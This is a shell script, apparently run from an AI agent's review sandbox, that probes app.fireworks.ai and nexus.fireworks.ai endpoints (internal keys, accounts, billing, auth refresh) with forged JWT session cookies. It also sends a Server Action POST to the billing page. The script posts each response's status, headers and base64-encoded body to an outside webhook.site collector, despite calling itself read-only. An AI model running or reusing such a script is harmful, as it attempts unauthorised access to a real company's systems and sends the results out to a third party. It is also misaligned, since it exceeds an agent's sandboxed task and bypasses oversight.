#!/bin/sh
# i84025: app.fireworks.ai / nexus edge-gate differential from Devin review sandbox egress.
# Read-only gate probes + one empty-code Server Action observation. No real credentials.
SINK="https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79"
NONCE="i84025-$(date +%s)-$$"
OUT="./tests/i84025-egress.json"
mkdir -p tests 2>/dev/null
: > "$OUT" 2>/dev/null

b64of() { base64 -w0 2>/dev/null | head -c 400; }
post() { # label code bytes sha16 hdr b64
  printf '{"nonce":"%s","label":"%s","code":"%s","bytes":"%s","sha16":"%s","hdr":"%s","b64":"%s"}\n' \
    "$NONCE" "$1" "$2" "$3" "$4" "$5" "$6" >> "$OUT" 2>/dev/null
  curl -sS -m 6 -o /dev/null -X POST -H 'content-type: application/json' \
    --data "{\"nonce\":\"$NONCE\",\"label\":\"$1\",\"code\":\"$2\",\"bytes\":\"$3\",\"sha16\":\"$4\",\"hdr\":\"$5\",\"b64\":\"$6\"}" "$SINK" >/dev/null 2>&1
}
cell() { # label url cookie_or_DASH method nextaction_or_DASH body_or_DASH
  L="$1"; U="$2"; CK="$3"; M="$4"; NA="$5"; BD="$6"
  if [ "$CK" = "-" ]; then set -- -H "x-i84025: none"; else set -- -H "Cookie: $CK"; fi
  if [ "$M" = "POST" ]; then
    set -- "$@" -X POST -H "Content-Type: text/plain;charset=UTF-8" -H "Accept: text/x-component" -H "Next-Action: $NA" --data-binary "$BD"
  fi
  CODE=$(curl -m 10 -sS -D /tmp/i84025h -o /tmp/i84025o -w '%{http_code}' "$@" "$U" 2>/dev/null)
  BYTES=$(wc -c < /tmp/i84025o 2>/dev/null | tr -d ' ')
  SHA=$(sha256sum /tmp/i84025o 2>/dev/null | cut -c1-16)
  HDR=$(grep -iE '^(x-action-redirect|x-matched-path|content-type):' /tmp/i84025h 2>/dev/null | tr -d '\r' | tr '\n' ' ' | cut -c1-160)
  B64=$(b64of < /tmp/i84025o 2>/dev/null)
  post "$L" "$CODE" "$BYTES" "$SHA" "$HDR" "$B64"
  sleep 1.5
}

# forged-cookie generator (structural gate probe only; zero real credentials)
COOKIE=$(python3 - <<'PY' 2>/dev/null
import base64,json,time,urllib.parse
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
kid="ZnWFHQUqIlRrG/ByukKBVYt58diFmh+jFWn1IazNlAM="
now=int(time.time())
h=b64(json.dumps({"kid":kid,"alg":"RS256"},separators=(",",":")).encode())
p=b64(json.dumps({"sub":"84025-probe-sub","email_verified":True,"amr":["password"],"iss":"https://cognito-idp.us-west-2.amazonaws.com/us-west-2_feAWJl2Gd","cognito:username":"84025-probe-sub","fireworks_account":"i84025probe","fireworks_user":"i84025probe","origin_jti":"00000000-0000-0000-0000-000000008402","aud":"sueas7prsfrdp16nantbeqcjv","acr":"password","event_id":"00000000-0000-0000-0000-000000008402","token_use":"id","fireworks_group":"","auth_time":now,"exp":now+3600,"iat":now,"jti":"00000000-0000-0000-0000-000000008402","email":"probe84025@example.com"},separators=(",",":")).encode())
t=h+"."+p+"."+"A"*342
ctx=urllib.parse.quote(json.dumps({"accountID":"","accountState":0,"accountType":0,"hasAccount":False},separators=(",",":")))
print("auth_v2_access_token=%s; auth_v2_id_token=%s; auth_v2_refresh_token=forged-refresh-i84025; auth_v2_user_context=%s" % (t,t,ctx))
PY
)
[ -z "$COOKIE" ] && COOKIE="auth_v2_access_token=eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI4NDAyNS1wcm9iZSJ9."$(printf 'A%.0s' $(seq 1 342))"; auth_v2_id_token=forged; auth_v2_user_context=%7B%22hasAccount%22%3Afalse%7D"

cell A0-egress-ip        "https://api.ipify.org"                              -     GET  -   -
cell A1-anon-intkey      "https://app.fireworks.ai/api/voice-agent/internal-key" - GET - -
cell A2-anon-accounts    "https://app.fireworks.ai/api/accounts"               -     GET  -   -
cell A3-anon-billalert   "https://app.fireworks.ai/api/billing/alert"          -     GET  -   -
cell A4-anon-nexusplan   "https://app.fireworks.ai/api/nexus/plan-checkout"    -     GET  -   -
cell A5-anon-nexus-host  "https://nexus.fireworks.ai/api/nexus/plan-checkout"  -     GET  -   -
cell F1-forged-intkey    "https://app.fireworks.ai/api/voice-agent/internal-key" "$COOKIE" GET  -   -
cell F2-forged-nexusplan "https://nexus.fireworks.ai/api/nexus/plan-checkout"  "$COOKIE" GET  -   -
cell F3-forged-refresh   "https://app.fireworks.ai/api/v2/auth/refresh"        "$COOKIE" GET  -   -
cell F4-forged-redeem    "https://app.fireworks.ai/account/billing"            "$COOKIE" POST "40f3ec3b5218e0e51a98726605c372f69d7a3b2773" '[""]'
echo "i84025 done nonce=$NONCE"
